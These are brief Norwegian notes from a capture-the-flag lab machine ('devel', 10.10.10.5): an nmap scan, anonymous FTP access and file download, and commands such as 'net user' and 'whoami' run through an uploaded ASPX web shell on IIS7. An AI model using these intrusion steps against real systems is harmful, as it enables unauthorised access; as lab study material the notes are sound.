# devel 10.10.10.5

windows maskin

`oot@kali:~# nmap -sS -P0 10.10.10.5`

`Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 09:47 EDT`

`Nmap scan report for 10.10.10.5`

`Host is up (0.061s latency).`

`Not shown: 998 filtered ports`

`PORT   STATE SERVICE`

`21/tcp open  ftp`

`80/tcp open  http`

logget inn ftp med anonymous. masse filer. last ned alt med `mget * .` og login med -i som fjerner prompts

http kjører iis7

[http://10.10.10.5/myshell.aspx](http://10.10.10.5/myshell.aspx)

kan her kjøre kommandoer. /c net user

User accounts for \

Administrator            babis                    Guest

The command completed with one or more errors.

/c whoami

iis apppool\web

